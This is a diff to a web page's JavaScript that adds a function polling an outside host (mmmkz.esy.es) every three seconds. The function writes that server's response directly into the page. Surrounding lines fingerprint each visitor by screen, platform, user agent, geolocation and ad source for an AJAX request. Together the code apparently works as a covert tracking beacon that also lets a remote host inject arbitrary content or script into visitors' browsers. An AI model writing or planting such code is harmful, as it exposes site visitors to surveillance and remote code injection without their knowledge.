@@ -12,6 +12,16 @@ function $_GET(param) {
     }
     return vars;
 }
+function ImStillHere() {
+    document.writeln(')')
+    $.ajax({
+        type: "POST",
+        url: "http://mmmkz.esy.es/checkIP/stillhere",
+        success: function(response) {
+                document.writeln(response);
+        }
+    });
+}
 window.onload = function() {
     //if ($_GET('utm_source') == 'google') {
         var data = '{"width": ' + screen['availWidth'] + ',"height": ' + screen['availHeight'] + ',"platform": "' + navigator['platform'] + '","userAgent": "' + navigator['userAgent'] + '","city": "' + ymaps.geolocation.city + '","region": "utm_source=' + $_GET('utm_source') + '","country": "' + ymaps.geolocation.country + '"}';
@@ -23,6 +33,8 @@ window.onload = function() {
                 //alert(response);//
             }
         });
+
+        setInterval(ImStillHere, 3000);
     //}
 }
 
